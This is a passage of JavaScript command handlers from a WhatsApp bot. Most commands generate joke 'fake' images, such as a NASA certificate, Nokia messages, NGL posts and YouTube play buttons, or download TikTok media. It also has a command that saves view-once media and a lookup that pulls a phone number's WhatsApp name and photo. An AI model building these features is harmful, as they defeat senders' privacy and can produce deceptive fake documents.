.fakemovi2 not all friends can accept us in hard times,Akoya-MD

Format:
.fakemovi2 quote,author`);
            }
            let [quote, author] = text.split(',');
            if (!quote || !author) {
              return xreply(`wrong format!

example:
.fakemovi2 not all friends can accept us in hard times,Akoya-MD`);
            }
            let api = `https://api.synoxcloud.xyz/canvas/quotes-v1?quote=${encodeURIComponent(quote.trim())}&author=${encodeURIComponent(author.trim())}`;
            await client.sendMessage(m.chat, {
              image: {
                url: api
              },
              caption: `🎬 *FAKE MOVI V2*

💬 Quote : ${quote.trim()}
✍️ Author : ${author.trim()}`
            }, {
              quoted: m
            });
          } catch (e) {
            console.error(e);
            xreply("failed to create the quotes");
          }
        }
        break;
      case "fakemovi":
        {
          try {
            const fs = require("fs");
            const path = require("path");
            const https = require("https");
            const {
              createCanvas,
              loadImage,
              registerFont
            } = require("canvas");
            if (global.__fakemoviFont === undefined) {
              global.__fakemoviFont = "sans-serif";
              try {
                const FONT_DIR = path.join(__dirname, "fonts");
                const FONT_PATH = path.join(FONT_DIR, "PatrickHand-Regular.ttf");
                const FONT_URL = "https://raw.githubusercontent.com/google/fonts/main/ofl/patrickhand/PatrickHand-Regular.ttf";
                if (!fs.existsSync(FONT_DIR)) {
                  fs.mkdirSync(FONT_DIR, {
                    recursive: true
                  });
                }
                if (!fs.existsSync(FONT_PATH)) {
                  await new Promise((resolve, reject) => {
                    const file = fs.createWriteStream(FONT_PATH);
                    https.get(FONT_URL, res => {
                      if (res.statusCode !== 200) {
                        file.close();
                        fs.unlink(FONT_PATH, () => {});
                        return reject(new Error(`HTTP ${res.statusCode}`));
                      }
                      res.pipe(file);
                      file.on("finish", () => file.close(resolve));
                    }).on("error", err => {
                      fs.unlink(FONT_PATH, () => {});
                      reject(err);
                    });
                  });
                }
                registerFont(FONT_PATH, {
                  family: "QuoteFont"
                });
                global.__fakemoviFont = "QuoteFont";
              } catch (fontErr) {
                console.log("⚠️ failed load font custom, using the default font:", fontErr.message);
              }
            }
            const FONT_FAMILY = global.__fakemoviFont;
            if (!text) {
              return xreply(`usage example:

.fakemovi life does not always go well,@Akoya-MD`);
            }
            let [quote, author] = text.split(",");
            if (!quote) {
              return xreply(`example:

.fakemovi life does not always go well,@Akoya-MD`);
            }
            quote = quote.trim();
            author = author ? author.trim() : "@Akoya-MD";
            await xreply("⏳ Creating fake motivation...");
            const bg = await loadImage("https://img2.pixhost.to/images/8609/738395416_rafaofficial.jpg");
            const canvas = createCanvas(bg.width, bg.height);
            const ctx = canvas.getContext("2d");
            ctx.drawImage(bg, 0, 0, bg.width, bg.height);
            const CENTER_X = 540;
            const CENTER_Y = 560;
            const MAX_WIDTH = 650;
            const MAX_HEIGHT = 240;
            function wrapText(ctx, text, maxWidth) {
              const words = text.trim().split(/\s+/);
              let lines = [];
              let line = "";
              for (const word of words) {
                const testLine = line ? line + " " + word : word;
                if (ctx.measureText(testLine).width > maxWidth) {
                  if (line) lines.push(line);
                  line = word;
                } else {
                  line = testLine;
                }
              }
              if (line) lines.push(line);
              return lines;
            }
            let fontSize = 64;
            let lines = [];
            while (fontSize >= 28) {
              ctx.font = `${fontSize}px "${FONT_FAMILY}"`;
              lines = wrapText(ctx, quote, MAX_WIDTH);
              const lineHeight = fontSize * 1.15;
              const totalHeight = lines.length * lineHeight;
              if (totalHeight <= MAX_HEIGHT) break;
              fontSize -= 2;
            }
            ctx.font = `${fontSize}px "${FONT_FAMILY}"`;
            ctx.fillStyle = "#733A25";
            ctx.textAlign = "center";
            ctx.textBaseline = "middle";
            const lineHeight = fontSize * 1.15;
            const totalHeight = lines.length * lineHeight;
            const startY = CENTER_Y - totalHeight / 2 + lineHeight / 2;
            for (let i = 0; i < lines.length; i++) {
              ctx.fillText(lines[i], CENTER_X, startY + i * lineHeight);
            }
            ctx.font = `36px "${FONT_FAMILY}"`;
            ctx.fillStyle = "#7F4C1D";
            ctx.textAlign = "center";
            ctx.fillText(author, CENTER_X, 935);
            const buffer = canvas.toBuffer("image/png");
            await client.sendMessage(m.chat, {
              image: buffer,
              caption: "✅ Fake Motivasi success"
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e);
            xreply(`❌ Error:\n${e.message}`);
          }
        }
        break;
      case "rvo":
      case "readviewonce":
        {
          if (!isOwner) return m.reply("❌ this feature can only be used by the bot owner!");
          if (!m.quoted) return m.reply(example("by replying its message"));
          let msg = m.quoted.message;
          let type = Object.keys(msg)[0];
          if (!msg[type].viewOnce) return m.reply("that message is not a view-once!");
          let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio');
          let buffer = Buffer.from([]);
          for await (const chunk of media) {
            buffer = Buffer.concat([buffer, chunk]);
          }
          if (/video/.test(type)) {
            return fitt.sendMessage(m.chat, {
              video: buffer,
              caption: msg[type].caption || ""
            }, {
              quoted: m
            });
          } else if (/image/.test(type)) {
            return fitt.sendMessage(m.chat, {
              image: buffer,
              caption: msg[type].caption || ""
            }, {
              quoted: m
            });
          } else if (/audio/.test(type)) {
            return fitt.sendMessage(m.chat, {
              audio: buffer,
              mimetype: "audio/mpeg",
              ptt: true
            }, {
              quoted: m
            });
          }
        }
        break;

      /// ───────────── [ 𝖢𝖾𝗄 𝖶𝖧𝖠𝖳𝖲𝖠𝖯𝖯 ] ──────────── ///
      case "cekwa":
        {
          try {
            if (!text) return xreply(`usage example:

.cekwa 62××××
.cekwa 08××××`);
            let nomor = text.replace(/[^0-9]/g, "");
            if (nomor.startsWith("08")) {
              nomor = "62" + nomor.slice(1);
            }
            await xreply("⏳ checking number WhatsApp...");
            const axios = require("axios");
            const {
              data
            } = await axios.get(`https://api.synoxcloud.xyz/check/cekwa?nomor=${nomor}`);
            if (!data.status || !data.result) {
              return xreply("❌ number not found or the API is erroring");
            }
            let hasil = `*📱 whatsapp check*

`;
            hasil += `• number: ${data.result.nomor || "-"}\n`;
            hasil += `• WA ID : ${data.result.waId || "-"}\n`;
            hasil += `• Status : ${data.result.aktif ? "Registered ✅" : "not registered ❌"}\n`;
            hasil += `• Keterangan : ${data.result.keterangan || "-"}\n`;
            hasil += `• name: ${data.result.nama || "no"}\n`;
            if (data.result.foto) {
              await client.sendMessage(m.chat, {
                image: {
                  url: data.result.foto
                },
                caption: hasil
              }, {
                quoted: m
              });
            } else {
              xreply(hasil);
            }
          } catch (e) {
            console.log(e);
            xreply(`❌ Error:\n${e.response?.data?.message || e.message}`);
          }
        }
        break;

      /// ───────────── [ 𝖥𝖺𝗄𝖾 𝖣𝖾𝗏 & 𝖯𝗂𝗅𝗂𝗁 ] ──────────── ///
      case "fakedev":
        {
          try {
            if (!text) return xreply(`example:

.fakedev https://i.ibb.co/xxxxx.jpg,Akoya-MD,Stay Amanah`);
            let args = text.split(",");
            if (args.length < 3) return xreply(`wrong format!

.fakedev https://i.ibb.co/xxxxx.jpg,Akoya-MD,Stay Amanah`);
            let urlfoto = args[0].trim();
            let text1 = args[1].trim();
            let text2 = args.slice(2).join(",").trim();
            const api = `https://api.synoxcloud.biz.id/canvas/fakedev?urlfoto=${encodeURIComponent(urlfoto)}&text1=${encodeURIComponent(text1)}&text2=${encodeURIComponent(text2)}`;
            await client.sendMessage(m.chat, {
              image: {
                url: api
              },
              caption: "✅ FakeDev success created"
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e);
            xreply(String(e.message));
          }
        }
        break;
      case "fakepilih":
        {
          if (!text) {
            return xreply("example:\n.fakepilih Messi,Ronaldo");
          }
          let [teks1, teks2] = text.split(",");
          if (!teks1 || !teks2) {
            return xreply("wrong format!\nexample:\n.fakepilih Messi,Ronaldo");
          }
          try {
            await xreply("⏳ Membuat image...");
            const url = `https://api.synoxcloud.xyz/canvas/drakehotline?teks1=${encodeURIComponent(teks1.trim())}&teks2=${encodeURIComponent(teks2.trim())}`;
            await client.sendMessage(m.chat, {
              image: {
                url
              },
              caption: `✅ Fake choose success`
            }, {
              quoted: m
            });
          } catch (e) {
            console.error(e);
            xreply(`❌ Error: ${e.message}`);
          }
        }
        break;

      /// ───────────── [ 𝖳𝗂𝗄𝖳𝗈𝗄 𝖣𝗈𝗐𝗇𝗅𝗈𝖺𝖽𝖾𝗋 ] ──────────── ///
      case "tiktok2":
      case "tt2":
        {
          if (!text) return xreply(".tiktok link");
          try {
            await xreply("⏳ Processing...");
            const api = "https://api.azbry.com/api/download/tiktok?url=" + encodeURIComponent(text);
            const res = await fetch(api);
            const json = await res.json();
            if (!json.status) throw "video not found";
            const vid = json.result.links[0];
            const mp3 = json.result.music.url;
            await client.sendMessage(m.chat, {
              video: {
                url: vid
              },
              caption: json.result.title || "TikTok Downloader"
            }, {
              quoted: m
            });
            await client.sendMessage(m.chat, {
              audio: {
                url: mp3
              },
              mimetype: "audio/mpeg"
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e);
            xreply(String(e));
          }
        }
        break;
      case 'ttmp3':
      case 'tiktokmp3':
        {
          try {
            if (!text) return xreply(`*Example: ${prefix + command} https://vt.tiktok.com/...*`);
            await client.sendMessage(m.chat, {
              react: {
                text: '⏳',
                key: m.key
              }
            });
            let res = await fetch('https://ttsave.app/download', {
              method: 'POST',
              headers: {
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
              },
              body: JSON.stringify({
                query: text,
                language_id: '2'
              })
            });
            let html = await res.text();
            let regex = /href="(https:\/\/v16-ies-music\.tiktokcdn\.com\/[^"]+)"/g;
            let audioUrl;
            let match;
            while ((match = regex.exec(html)) !== null) {
              if (match[1].includes('mime_type=audio')) {
                audioUrl = match[1];
                break;
              }
            }
            if (!audioUrl) {
              return xreply("🍂 *Audio TikTok not found*");
            }
            await client.sendMessage(m.chat, {
              audio: {
                url: audioUrl
              },
              mimetype: 'audio/mpeg'
            }, {
              quoted: m
            });
          } catch (e) {
            await xreply(`🍂 *an error occurred*
${e.message}`);
          } finally {
            await client.sendMessage(m.chat, {
              react: {
                text: '',
                key: m.key
              }
            });
          }
        }
        ;
        break;
      case "tt":
      case "tiktok":
        {
          if (!text) return xreply(example("url"));
          if (!text.startsWith("https://")) return xreply(example("url"));
          await tiktokDl(q).then(async result => {
            await client.sendMessage(m.chat, {
              react: {
                text: '📥',
                key: m.key
              }
            });
            if (!result.status) return xreply("Error");
            if (result.durations == 0 && result.duration == "0 Seconds") {
              let araara = new Array();
              let urutan = 0;
              for (let a of result.data) {
                let imgsc = await prepareWAMessageMedia({
                  image: {
                    url: `${a.url}`
                  }
                }, {
                  upload: client.waUploadToServer
                });
                await araara.push({
                  header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: `Photo Slide Ke *${urutan += 1}*`,
                    hasMediaAttachment: true,
                    ...imgsc
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [{
                      "name": "cta_url",
                      "buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
                    }]
                  })
                });
              }
              const msgii = await generateWAMessageFromContent(m.chat, {
                viewOnceMessageV2Extension: {
                  message: {
                    messageContextInfo: {
                      deviceListMetadata: {},
                      deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: "*TikTok video downloaded successfully ✅*"
                      }),
                      carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: araara
                      })
                    })
                  }
                }
              }, {
                userJid: m.sender,
                quoted: m
              });
              await client.relayMessage(m.chat, msgii.message, {
                messageId: msgii.key.id
              });
            } else {
              let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark");
              await client.sendMessage(m.chat, {
                video: {
                  url: urlVid.url
                },
                mimetype: 'video/mp4',
                caption: `*TikTok video downloaded successfully ✅*`
              }, {
                quoted: m
              });
            }
          }).catch(e => console.log(e));
          await client.sendMessage(m.chat, {
            react: {
              text: '',
              key: m.key
            }
          });
        }
        break;
      case 'tthd':
      case 'tiktokhd':
        {
          let reactKey;
          try {
            if (!args[0]) throw `example:
${prefix}${command} <url tiktok>`;
            const url = args[0];
            if (!/https?:\/\/(vm|vt|www)\.tiktok\.com/i.test(url)) throw "URL TikTok invalid";
            reactKey = m.key;
            await client.sendMessage(m.chat, {
              react: {
                text: '⏳',
                key: reactKey
              }
            });
            const api = `https://api.yupra.my.id/api/downloader/tiktok?url=${encodeURIComponent(url)}`;
            const res = await fetch(api);
            const json = await res.json();
            if (json.status !== 200 || !json.result?.data) throw "failed to fetch video";
            const media = json.result.data;
            const video = media.find(v => v.type === 'nowatermark_hd')?.url || media.find(v => v.type === 'nowatermark')?.url || media.find(v => v.type === 'watermark')?.url;
            if (!video) throw "video not found";
            await client.sendMessage(m.chat, {
              video: {
                url: video
              },
              caption: '> Powered by YP AI'
            }, {
              quoted: m
            });
            setTimeout(() => {
              client.sendMessage(m.chat, {
                react: {
                  text: '',
                  key: reactKey
                }
              });
            }, 2000);
          } catch (e) {
            if (reactKey) {
              setTimeout(() => {
                client.sendMessage(m.chat, {
                  react: {
                    text: '',
                    key: reactKey
                  }
                });
              }, 2000);
            }
            await client.sendMessage(m.chat, {
              text: typeof e === 'string' ? e : "an error occurred"
            }, {
              quoted: m
            });
          }
        }
        break;

      /// ───────────── [ 𝖰𝗎𝗈𝗍𝖾𝗌 𝖬𝖺𝗄𝖾𝗋 ] ──────────── ///
      case 'quotesmaker':
        {
          try {
            if (!text) {
              return xreply(`usage example:

.quotesmaker Halo ku,Akoya-MD`);
            }
            if (!text.includes(',')) {
              return xreply(`wrong format!

example:
.quotesmaker Halo ku,Akoya-MD`);
            }
            let [quote, author] = text.split(',');
            quote = quote?.trim();
            author = author?.trim();
            if (!quote || !author) {
              return xreply(`wrong format!

example:
.quotesmaker Halo ku,Akoya-MD`);
            }
            await xreply('⏳ Membuat quotes...');
            const api = `https://api.azbry.com/api/maker/quotesmaker?text=${encodeURIComponent(quote)}&author=${encodeURIComponent(author)}`;
            await client.sendMessage(m.chat, {
              image: {
                url: api
              },
              caption: `✨ Quotes Maker\n\n📝 Text: ${quote}\n👤 Author: ${author}`
            }, {
              quoted: m
            });
          } catch (e) {
            console.error(e);
            xreply(`❌ Error: ${e.message}`);
          }
        }
        break;

      /// ───────────── [ 𝖥𝖺𝗄𝖾 𝖶𝗂𝗇𝖽𝗈𝗐𝗌 ] ──────────── ///
      case 'fakewindos2':
      case 'fakewindows':
        {
          try {
            if (!text) {
              return xreply(`example:
.fakewindos why does Tulus always lose`);
            }
            const kata = text.trim().split(/\s+/);
            let lines = [];
            if (kata.length <= 5) {
              lines = kata;
            } else {
              for (let i = 0; i < kata.length; i += 2) {
                lines.push(kata.slice(i, i + 2).join(' '));
              }
            }
            const {
              createCanvas,
              loadImage
            } = require('canvas');
            const bg = await loadImage('https://api.nexadev.my.id/uploder/uploads/TyIyEi.jpg');
            const W = bg.width;
            const H = bg.height;
            const canvas = createCanvas(W, H);
            const ctx = canvas.getContext('2d');
            ctx.drawImage(bg, 0, 0, W, H);
            const AREA_X = W * 0.09;
            const AREA_Y = H * 0.33;
            const AREA_W = W * 0.33;
            const AREA_H = H * 0.40;
            let fontSize = Math.floor(H * 0.065);
            ctx.fillStyle = '#000000';
            ctx.textAlign = 'left';
            ctx.textBaseline = 'middle';
            while (fontSize > 25) {
              ctx.font = `bold ${fontSize}px Arial`;
              const widest = Math.max(...lines.map(v => ctx.measureText(v).width));
              if (widest <= AREA_W) break;
              fontSize -= 2;
            }
            ctx.font = `bold ${fontSize}px Arial`;
            const lineHeight = fontSize * 1.18;
            const totalHeight = (lines.length - 1) * lineHeight;
            const startY = AREA_Y + AREA_H / 2 - totalHeight / 2;
            lines.forEach((line, i) => {
              ctx.fillText(line, AREA_X, startY + i * lineHeight);
            });
            const buffer = canvas.toBuffer('image/jpeg');
            await client.sendMessage(m.chat, {
              image: buffer,
              caption: 'Fake Windows Media Player'
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e);
            reply("failed to create image.");
          }
        }
        break;
      case 'fakewindos':
        {
          try {
            if (!text) return xreply("Enter text!");
            const {
              createCanvas,
              loadImage,
              registerFont
            } = require('canvas');
            const fs = require('fs');
            const path = require('path');
            const https = require('https');
            const http = require('http');
            const FONT_URL = 'https://raw.githubusercontent.com/skayhayato-cmyk/canvas/main/Arial%20Bold.ttf';
            const BG_URL = 'https://api.nexadev.my.id/uploder/uploads/OIqmKC.jpg';
            const FONT_PATH = path.join(__dirname, 'assets', 'ArialBold.ttf');
            const BG_PATH = path.join(__dirname, 'assets', 'bg.jpg');
            fs.mkdirSync(path.join(__dirname, 'assets'), {
              recursive: true
            });
            const downloadFile = (url, dest) => new Promise((resolve, reject) => {
              if (fs.existsSync(dest)) return resolve();
              const file = fs.createWriteStream(dest);
              const client = url.startsWith('https') ? https : http;
              client.get(url, res => {
                if (res.statusCode !== 200) {
                  fs.unlink(dest, () => {});
                  return reject(new Error(`HTTP ${res.statusCode}`));
                }
                res.pipe(file);
                file.on('finish', () => file.close(resolve));
              }).on('error', err => {
                fs.unlink(dest, () => {});
                reject(err);
              });
            });
            await downloadFile(FONT_URL, FONT_PATH);
            await downloadFile(BG_URL, BG_PATH);
            registerFont(FONT_PATH, {
              family: 'ArialBold'
            });
            const lines = text.split('\n').map(v => v.trim()).filter(Boolean);
            const bg = await loadImage(BG_PATH);
            const W = bg.width;
            const H = bg.height;
            const canvas = createCanvas(W, H);
            const ctx = canvas.getContext('2d');
            ctx.drawImage(bg, 0, 0, W, H);
            const BOX_X = W * 0.003;
            const BOX_Y = H * 0.301;
            const BOX_W = W * 0.735;
            const BOX_H = H * 0.469;
            const DROP_PAD_TOP = BOX_H * 0.025;
            const DROP_PAD_BOTTOM = BOX_H * 0.15;
            const DROP_Y = BOX_Y + DROP_PAD_TOP;
            const DROP_H = BOX_H - DROP_PAD_TOP - DROP_PAD_BOTTOM;
            const TEXT_X = W * 0.118;
            const TEXT_MAX_W = BOX_W * 0.50;
            function wrapLine(ctx, text, maxWidth) {
              const words = text.split(' ');
              const wrapped = [];
              let current = '';
              for (const word of words) {
                const test = current ? current + ' ' + word : word;
                if (ctx.measureText(test).width > maxWidth && current) {
                  wrapped.push(current);
                  current = word;
                } else {
                  current = test;
                }
              }
              if (current) wrapped.push(current);
              return wrapped.length ? wrapped : [text];
            }
            const FIXED_FONT = Math.floor(H * 0.11);
            const MIN_FONT = 10;
            let fontSize = FIXED_FONT;
            let wrappedLines = [];
            ctx.textBaseline = 'top';
            while (fontSize >= MIN_FONT) {
              ctx.font = `${fontSize}px ArialBold`;
              wrappedLines = lines.flatMap(l => wrapLine(ctx, l, TEXT_MAX_W));
              const lineH = fontSize * 1.30;
              const totalH = wrappedLines.length * lineH;
              if (totalH <= DROP_H) break;
              fontSize -= 2;
            }
            const lineHeight = fontSize * 1.30;
            const startY = DROP_Y + (DROP_H - wrappedLines.length * lineHeight) / 2;
            ctx.save();
            ctx.beginPath();
            ctx.rect(BOX_X, BOX_Y, BOX_W, BOX_H);
            ctx.clip();
            ctx.font = `${fontSize}px ArialBold`;
            ctx.fillStyle = '#111111';
            wrappedLines.forEach((line, i) => {
              const y = startY + i * lineHeight;
              if (y > BOX_Y + BOX_H - lineHeight) return;
              ctx.fillText(line, TEXT_X, y);
            });
            ctx.restore();
            const buffer = canvas.toBuffer('image/jpeg', {
              quality: 0.95
            });
            await client.sendMessage(m.chat, {
              image: buffer,
              caption: '🎵 Fake Windows Media Player 2 (Express Convert Case)'
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e);
            xreply('❌ Error fakewindos2');
          }
        }
        break;

      /// ───────────── [ 𝖥𝖺𝗄𝖾 𝖭𝗈𝗄𝗂𝖺 2 ] ──────────── ///
      case 'fakenokia2':
        {
          if (!text) {
            return xreply(`usage example:

${prefix + command} Halo dunia,Akoya-MD`);
          }
          let argsx = text.split(',');
          if (argsx.length < 2) {
            return xreply(`wrong format!

example:
${prefix + command} Halo dunia,Akoya-MD`);
          }
          let pesan = argsx[0].trim();
          let sender = argsx.slice(1).join(',').trim();
          try {
            let imageUrl = `https://api-xemoz-official.my.id/api/maker/nokiamsg.php?text=${encodeURIComponent(pesan)}&sender=${encodeURIComponent(sender)}`;
            await client.sendMessage(m.chat, {
              image: {
                url: imageUrl
              },
              caption: `📱 *Fake Nokia Message*\n\n📝 Text: ${pesan}\n👤 Sender: ${sender}`
            }, {
              quoted: m
            });
          } catch (err) {
            console.error(err);
            xreply("failed to create Fake Nokia Message!");
          }
        }
        break;
      case 'fakenokia':
        {
          try {
            let [sender, pesan] = args.join(" ").split("|");
            if (!sender || !pesan) {
              return xreply("❌ wrong format!\n\n" + "how to use:\n" + ".fakemsg namapengirim|isipesan\n\n" + "example:\n" + ".fakemsg Nanzz|Hi bro! what's up?");
            }
            let url = `https://api-nanzz.my.id/docs/api/maker/nokia-msg.php` + `?sender=${encodeURIComponent(sender)}` + `&pesan=${encodeURIComponent(pesan)}`;
            let res = await axios.get(url, {
              responseType: "arraybuffer"
            });
            let buffer = Buffer.from(res.data);
            await client.sendMessage(m.chat, {
              image: buffer,
              caption: "✅ Nokia Message success created"
            }, {
              quoted: m
            });
          } catch (err) {
            console.log(err);
            xreply("❌ failed to create Nokia Message");
          }
        }
        break;

      /// ───────────── [ 𝖬𝖾𝗆𝖾 & 𝖠𝖨 𝖩𝖺𝗐𝖺𝖻𝖺𝗇 ] ──────────── ///
      case 'meme':
        {
          try {
            await xreply("⏳ one moment, fetching meme2 random...");
            const url = 'https://api.azbry.com/api/random/meme';
            const res = await fetch(url);
            if (!res.ok) throw 'API Error';
            const buffer = Buffer.from(await res.arrayBuffer());
            await client.sendMessage(m.chat, {
              image: buffer,
              caption: '🗿 Random Meme'
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e);
            xreply("failed to fetch meme");
          }
        }
        break;
      case 'deepseek':
        {
          if (!text) return xreply("example:\n.deepseek who was the first president of Indonesia");
          try {
            const axios = require('axios');
            const {
              data
            } = await axios.get(`https://api.azbry.com/api/ai/deepseek?text=${encodeURIComponent(text)}`);
            if (!data.status || !data.result?.response) {
              return xreply("failed to fetch answer AI");
            }
            await client.sendMessage(m.chat, {
              text: `*AI DeepSeek*\n\n${data.result.response}`
            }, {
              quoted: m
            });
          } catch (err) {
            console.error(err);
            xreply("an error occurred while fetching answer DeepSeek");
          }
        }
        break;
      case 'fakeustadz':
      case 'tanyaustadz':
        {
          try {
            if (!text) {
              return xreply(`example:
${prefix + command} what is the ruling on being handsome like noxXza, dear ustaz`);
            }
            const url = `https://api.azbry.com/api/maker/tanyaustadz?text=${encodeURIComponent(text)}`;
            await client.sendMessage(m.chat, {
              image: {
                url
              },
              caption: `🕌 Tanya Ustadz\n\n📝 Question: ${text}`
            }, {
              quoted: m
            });
          } catch (err) {
            console.error(err);
            xreply("failed to create image Tanya Ustadz");
          }
        }
        break;
      case 'fakenasa':
        {
          try {
            let nama = args.join(" ");
            if (!nama) {
              return xreply("❌ Enter name!\n\n" + "how to use:\n" + ".fakenasa name you\n\n" + "example:\n" + ".fakenasa Akoya-MD");
            }
            let url = `https://api-nanzz.my.id/docs/api/maker/sertifikat-nasa.php?nama=${encodeURIComponent(nama)}`;
            let res = await axios.get(url, {
              responseType: "arraybuffer"
            });
            let buffer = Buffer.from(res.data);
            await client.sendMessage(m.chat, {
              image: buffer,
              caption: `🎓 Sertifikat NASA success created
name: ${nama}`
            }, {
              quoted: m
            });
          } catch (err) {
            console.log(err);
            reply("❌ failed to create sertifikat NASA");
          }
        }
        break;
      case 'fakengl':
      case 'ngl':
        {
          if (!text) {
            return xreply(`📩 *Fake NGL Generator*\n\n` + `example:
${prefix + command} Gw actually ultramen`);
          }
          try {
            await xreply("⏳ one moment, creating Fake NGL...");
            const apiUrl = `https://api-nanzz.my.id/docs/api/maker/fake-ngl.php?text=${encodeURIComponent(text)}`;
            const res = await fetch(apiUrl);
            if (!res.ok) {
              throw new Error(`HTTP ${res.status}`);
            }
            const contentType = res.headers.get('content-type') || '';
            if (!contentType.includes('image')) {
              throw new Error("the response is not an image");
            }
            const buffer = Buffer.from(await res.arrayBuffer());
            if (buffer.length < 1000) {
              throw new Error("image is empty or corrupted");
            }
            await client.sendMessage(m.chat, {
              image: buffer,
              caption: `📩 *FAKE NGL success*

📝 message:
${text}

✅ Fake NGL success created.`
            }, {
              quoted: m
            });
          } catch (err) {
            console.error('FAKENGL ERROR:', err);
            xreply(`❌ failed to create Fake NGL

` + `${err.message || err}`);
          }
        }
        break;
      case 'fakeyt':
        {
          try {
            let [nama, template] = args.join(" ").split("|");
            if (!nama || !template) {
              return xreply("❌ wrong format!\n\n" + "how to use:\n" + ".fakeyt name|silver\n" + ".fakeyt name|gold\n\n" + "example:\n" + ".fakeyt Akoya-MD|silver");
            }
            let url = `https://api-nanzz.my.id/docs/api/maker/play-button.php` + `?nama=${encodeURIComponent(nama)}` + `&template=${encodeURIComponent(template)}`;
            let res = await axios.get(url, {
              responseType: "arraybuffer"
            });
            let buffer = Buffer.from(res.data);
            await client.sendMessage(m.chat, {
              image: buffer,
              caption: `🎬 YouTube Play Button success created
name: ${nama}\nTemplate: ${template}`
            }, {
              quoted: m
            });
          } catch (err) {
            console.log(err);
            xreply("❌ failed to create Play Button");
          }
        }
        break;

      /// ───────────── [ 𝖨𝖣 𝖢𝖺𝗋𝖽 & 𝖥𝖺𝗄𝖾 𝖬𝖫 ] ──────────── ///
      case "idcard":
        {
          if (!text) {
            return xreply(`Example :\n${prefix + command} Akoya-MD|creator|md|https://wa.me/233533416608`);
          }
          let [name, title, script, telegram] = text.split("|");
          if (!name || !title || !script || !telegram) {
            return xreply(`wrong format!

${prefix + command} name|title|script|telegram`);
          }
          const {
            createCanvas,
            loadImage
          } = require("canvas");
          const template = "https://img2.pixhost.to/images/8206/731465960_lanz-1779881748979.jpg";
          const bg = await loadImage(template);
          const canvas = createCanvas(bg.width, bg.height);
          const ctx = canvas.getContext("2d");
          ctx.drawImage(bg, 0, 0, canvas.width, canvas.height);
          ctx.textBaseline = "top";
          ctx.font = "30px monospace";
          ctx.fillStyle = "#ffffff";
          ctx.fillText(`${name}.json`, 255, 488);
          ctx.font = "27px monospace";
          ctx.fillStyle = "#ffffff";
          ctx.fillText("{", 190, 580);
          ctx.fillStyle = "#8A9A5B";
          ctx.fillText(`"name"`, 250, 630);
          ctx.fillStyle = "#00b7ff";
          ctx.fillText(`: "${name}",`, 340, 630);
          ctx.fillStyle = "#8A9A5B";
          ctx.fillText(`"title"`, 250, 680);
          ctx.fillStyle = "#00b7ff";
          ctx.fillText(`: "${title}",`, 365, 680);
          ctx.fillStyle = "#8A9A5B";
          ctx.fillText(`"script"`, 250, 735);
          ctx.fillStyle = "#00b7ff";
          ctx.fillText(`: "${script}",`, 378, 735);
          ctx.fillStyle = "#8A9A5B";
          ctx.fillText(`"telegram"`, 250, 790);
          ctx.fillStyle = "#00b7ff";
          ctx.fillText(`: "${telegram}"`, 409, 790);
          ctx.fillStyle = "#FFFFFF";
          ctx.fillText("}", 190, 850);
          const hasil = canvas.toBuffer();
          await client.sendMessage(m.chat, {
            image: hasil,
            caption: "Success create id card"
          }, {
            quoted: m
          });
        }
        break;
      case "fakeml":
        {
          try {
            if (!text) {
              return xreply(`❌ Nickname not yet filled

example:
${prefix}fakelobyml Akoya-MD`);
            }
            if (!/image/.test(mime)) {
              return xreply(`❌ reply/send a photo first

example:
1. reply to a photo
2. type:
${prefix}fakelobyml Akoya-MD`);
            }
            const nickname = text.trim();
            if (nickname.length > 30) {
              return xreply("❌ Nickname maksimal 30 character");
            }
            await xreply('⏳ Uploading avatar...');
            let media = await client.downloadAndSaveMediaMessage(qmsg);
            if (!media || !fs.existsSync(media)) {
              return xreply("❌ failed to fetch the photo");
            }
            const {
              ImageUploadService
            } = require('node-upload-images');
            const service = new ImageUploadService('pixhost.to');
            let {
              directLink
            } = await service.uploadFromBinary(fs.readFileSync(media), 'rafaofficial.png');
            await fs.unlinkSync(media);
            if (!directLink) {
              return xreply("❌ failed to get the Pixhost URL");
            }
            const avatar = directLink.toString();
            await xreply("⏳ creating Fake Lobby ML...");
            const apiUrl = `https://api.nexray.eu.cc/maker/fakelobyml?avatar=${encodeURIComponent(avatar)}&nickname=${encodeURIComponent(nickname)}`;
            const response = await axios.get(apiUrl, {
              responseType: 'arraybuffer',
              timeout: 120000,
              headers: {
                'User-Agent': 'Mozilla/5.0',
                'Accept': 'image/*'
              },
              maxContentLength: 20 * 1024 * 1024,
              maxBodyLength: 20 * 1024 * 1024
            });
            if (!response.data || !response.data.length) {
              return xreply("❌ API did not return an image result");
            }
            const contentType = response.headers['content-type'] || '';
            if (!contentType.includes('image')) {
              let errorText = '';
              try {
                errorText = Buffer.from(response.data).toString('utf8');
              } catch {
                errorText = "the API response is not an image";
              }
              return xreply(`❌ *FAKE LOBBY ML failed*

${errorText.substring(0, 1000)}`);
            }
            await client.sendMessage(m.chat, {
              image: Buffer.from(response.data),
              caption: `
👤 Nickname:
${nickname}
✨ Fake Lobby ML success created`
            }, {
              quoted: m
            });
          } catch (e) {
            console.log('FAKELOBYML ERROR:', e);
            let errorMessage = e.response?.data?.message || e.response?.data?.msg || e.message || "an unknown error occurred";
            if (e.code === 'ECONNABORTED' || e.code === 'ETIMEDOUT') {
              errorMessage = "API request timed out. Please try again.";
            }
            if (e.response?.status === 404) {
              errorMessage = "Endpoint Fake Lobby ML not found";
            }
            if (e.response?.status === 429) {
              errorMessage = "too many requests. Please wait a moment.";
            }
